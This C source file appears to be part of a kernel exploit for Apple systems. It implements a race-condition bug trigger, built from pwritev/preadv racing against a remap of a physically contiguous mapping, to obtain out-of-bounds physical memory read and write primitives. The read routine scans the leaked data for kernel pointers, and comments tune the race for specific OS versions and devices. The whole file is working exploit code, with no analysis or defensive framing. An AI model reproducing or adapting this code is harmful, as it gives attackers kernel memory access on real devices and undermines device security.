#include "phys_oob.h"

#include <string.h>
#include <sys/uio.h>
#include <unistd.h>

#include "surface.h"
#include <errno.h>

// creates physically contiguous mapping in Purplegfxmem and sets marker to it
void cs2_init_phys_rw(mach_vm_size_t contiguous_mapping_size) {
    cs2_ctx.pc_size = contiguous_mapping_size;
    kern_return_t kr = cs2_create_pc_mapping(&cs2_ctx.pc_object, &cs2_ctx.pc_address, cs2_ctx.pc_size);
    if (kr != KERN_SUCCESS) {
        LOG_ERR("cs2_create_pc_mapping: %s (%d)", mach_error_string(kr), kr);
        return;
    }

    // pc -> physically contiguous
    LOG("pc_object: %#x", cs2_ctx.pc_object);
    LOG("pc_address: %#llx", cs2_ctx.pc_address);

    // set random marker
    memset_pattern8((void*)cs2_ctx.pc_address, &cs2_ctx.random_marker, cs2_ctx.pc_size);

    // "free target" will be the addr of the pc mapping
    cs2_ctx.free_target = cs2_ctx.pc_address;
    cs2_ctx.free_target_size = cs2_ctx.pc_size;

    atomic_store_explicit(&cs2_ctx.shared->free_target_sync, cs2_ctx.free_target, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->free_target_size_sync, cs2_ctx.free_target_size, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->free_thread_start, 1, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->go_sync, 1, memory_order_seq_cst);
}

static uint64_t first_try_logs = 0;

kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
    // target_object_sync here on first pass is set to memory_object from mem entry
    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    // offset we're at in the search mapping
    atomic_store_explicit(&cs2_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);

    // set iov base to physically contiguous addr + 0x3f00
    cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);
    /* Two capture lanes (24A435 recovered TAP 2026-11-04):
         OG / A13 18.x: iov_len = 0x1000, HIT only when pwritev EFAULT (w==-1)
           then pread. That is Dopamine ClearSword verbatim.
         27.0 / T8150: pwritev returns the full length (w=4096 on verbatim,
           w=16384 on calib). LightSword ID-sweep: ok=30720 fail=0, PARTIAL
           and WRONG live on the SUCCESS copy. Inspect the file whenever
           copy_confusion_lane is set. iov_len = vm_page_size matches calib.
       hop-1 cluster_*_contig stays closed (EINVAL since 26.1). */
    size_t iov_len = (cs2_ctx.copy_confusion_lane && vm_page_size)
        ? (size_t)vm_page_size
        : (size_t)(offset + size);
    cs2_ctx.iov.iov_len = iov_len;

    memcpy(buffer, &cs2_ctx.random_marker, sizeof(uint64_t));
    memcpy((void*)(cs2_ctx.pc_address + 0x3f00 + offset), &cs2_ctx.random_marker, sizeof(uint64_t));

    bool read_race_succeeded = false;
    ssize_t w = 0;

    /* volume law: 100 tries × 8 mappings × 0x2000 pages = VM machine-gun
       (configd watchdog 2026-11-04 19:36 EST, P007OpenOnly 1.24GiB / 13M faults).
       copy27: 8 tries until first HIT, then 16. OG EFAULT: adaptive 100+. */
    uint64_t max_tries = cs2_ctx.copy_confusion_lane
        ? (cs2_ctx.highiest_success_idx ? 16ull : 8ull)
        : (cs2_ctx.highiest_success_idx + 100ull);
    for (uint64_t try_idx = 0; try_idx < max_tries; try_idx++) {
        if (try_idx && cs2_expired()) return KERN_FAILURE;   /* budget law: never exceed the 300s tap budget */
        atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
        // trigger bug to read oob_offset oob
        w = pwritev(cs2_ctx.read_fd, &cs2_ctx.iov, 1, 0x3f00);
        int saved_errno = errno;
        if (try_idx == 0 && first_try_logs++ < 6)
            LOG("oob try0: w=%zd errno=%d (win-cap=%llu) lane=%s iov=%zx",
                w, (w == -1) ? saved_errno : 0,
                (unsigned long long)cs2_ctx.highiest_success_idx,
                cs2_ctx.copy_confusion_lane ? "copy27" : "efault",
                iov_len);
        while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1);
        mach_vm_address_t map_addr = cs2_ctx.pc_address;
        // put physicallly contiguous mapping back
        kern_return_t kr =
            mach_vm_map(mach_task_self(), &map_addr, cs2_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, cs2_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            LOG_ERR("cs2_oob_read: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return KERN_FAILURE;
        }

        if (w == -1 || (cs2_ctx.copy_confusion_lane && w > 0)) {
            /* Pre-fill so a short pread cannot look like a PARTIAL HIT
               (calloc zeros / leftover from the previous page). */
            memset_pattern8(buffer, &cs2_ctx.random_marker, size);
            ssize_t nread = pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset);
            if (nread < 8) {
                usleep(1);
                continue;
            }
            uint64_t q0 = 0, q1 = 0;
            memcpy(&q0, buffer, sizeof(q0));
            if (nread >= 16) memcpy(&q1, buffer + 8, sizeof(q1));
            uint64_t unmarked = 0, kptr_n = 0, spray_n = 0, first_foreign = 0;
            size_t nq = (size_t)nread / 8;
            for (size_t qi = 0; qi < nq; qi++) {
                uint64_t q = 0;
                memcpy(&q, buffer + qi * 8, sizeof(q));
                if (q == cs2_ctx.random_marker) continue;
                unmarked++;
                if (!first_foreign) first_foreign = q;
                if ((q >> 36) == 0xfffffff0ull) kptr_n++;
                if ((q >> 32) == 0xc0dec0deull) spray_n++;
            }
            /* OG: wholesale page replace, q0 != marker.
               copy27: calib PARTIAL is mixed (q0 still marker, later qwords
               foreign). Hunt those windows too. hop-1 stays closed. */
            bool wholesale = (unmarked > 0 && q0 != cs2_ctx.random_marker);
            bool partial = (cs2_ctx.copy_confusion_lane && unmarked > 0 && q0 == cs2_ctx.random_marker);
            if (wholesale || partial) {
                read_race_succeeded = true;
                cs2_ctx.success_read_count += 1;
                if (try_idx > cs2_ctx.highiest_success_idx) {
                    cs2_ctx.highiest_success_idx = try_idx;
                }
                {
                    static uint64_t hit_logs = 0;
                    if (hit_logs++ < 8) {
                        const char *cls = "other";
                        if (kptr_n) cls = "KERNEL POINTER";
                        else if (spray_n) cls = "spray-page tag";
                        LOG("oob HIT lane=%s kind=%s cls=%s w=%zd try=%llu q0=%#llx foreign=%#llx unmarked=%llu kptr=%llu spray=%llu",
                            w == -1 ? "efault" : "copy27",
                            partial ? "PARTIAL" : "WHOLESALE",
                            cls, w, (unsigned long long)try_idx, q0, first_foreign,
                            (unsigned long long)unmarked,
                            (unsigned long long)kptr_n,
                            (unsigned long long)spray_n);
                    }
                }
                break;
            }
            {
                static uint64_t miss_logs = 0;
                miss_logs++;
                if (cs2_ctx.copy_confusion_lane && (miss_logs <= 4 || (miss_logs % 2048) == 0))
                    LOG("oob MISS lane=copy27 q0=%#llx q1=%#llx (full marker, UPL neighbor silent)",
                        q0, q1);
            }
            usleep(1);
        }

        if (try_idx == 500) {
            // LOG_DEBUG("we failed");
            break;
        }
    }
    // LOG_DEBUG("read race result success is: %s", read_race_succeeded ? "true" : "false");
    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
    return read_race_succeeded ? KERN_SUCCESS : KERN_FAILURE;
}

// retry until success
void cs2_oob_read_retry(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint64_t oob_size, uint64_t oob_offset, uint8_t* read_buffer) {
    while (true) {
        kern_return_t kr = cs2_oob_read(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        if (kr == KERN_SUCCESS) {
            break;
        }
    }
}

void cs2_oob_write(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);

    cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);
    cs2_ctx.iov.iov_len = (cs2_ctx.copy_confusion_lane && vm_page_size)
        ? (size_t)vm_page_size
        : (size_t)(offset + size);
    // read from buffer into fd
    pwrite(cs2_ctx.write_fd, buffer, size, 0x3f00 + offset);

    for (uint64_t try_idx = 0; try_idx < 20; try_idx++) {
        atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
        // write from the fd into (oob) memory
        preadv(cs2_ctx.write_fd, &cs2_ctx.iov, 1, 0x3f00);
        while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1);

        mach_vm_address_t map_addr = cs2_ctx.pc_address;
        kern_return_t kr =
            mach_vm_map(mach_task_self(), &map_addr, cs2_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, cs2_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            LOG_ERR("cs2_oob_write: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return;
        }
    }

    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
}
